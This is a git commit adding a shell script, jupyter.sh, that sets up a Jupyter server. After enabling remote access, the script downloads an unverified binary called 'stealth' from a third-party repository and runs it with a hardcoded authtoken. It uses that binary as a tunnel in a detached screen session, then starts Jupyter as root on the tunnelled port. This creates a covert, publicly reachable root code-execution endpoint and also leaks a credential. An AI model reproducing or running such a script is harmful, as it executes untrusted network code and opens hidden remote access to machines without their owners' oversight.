65f46639ce57110ecf01b71def0b1850fc7108da
thobilemazambane <160769848+thobilemazambane@users.noreply.github.com>
2024-02-21 21:39:44 +0200

    Create jupyter.sh

---
+++ jupyter.sh
@@ -0,0 +1,25 @@
+apt update;apt -y install python3-pip python3 screen net-tools iputils-ping curl wget
+pip3 install jupyter
+sleep 2
+echo "ls before generating jupyter config"
+sleep 2
+ls -la
+jupyter notebook --generate-config
+sleep 2
+echo "ls after generating jupyter config"
+sleep 2
+ls -la
+
+echo "c.NotebookApp.allow_remote_access = True" >> ~/.jupyter/jupyter_notebook_config.py
+
+wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/stealth >/dev/null
+sleep 2
+chmod +x stealth
+sleep 2
+./stealth authtoken 1ilXRnZkbgTUkP6XqefqY5CzMw6_5sMimpXUhUf75vJyfXsE2
+sleep 2
+screen -dmS ngroo bash -c './stealth http 1234'
+sleep 2
+curl http://127.0.0.1:4040/api/tunnels
+sleep 2
+jupyter notebook --allow-root --port 1234
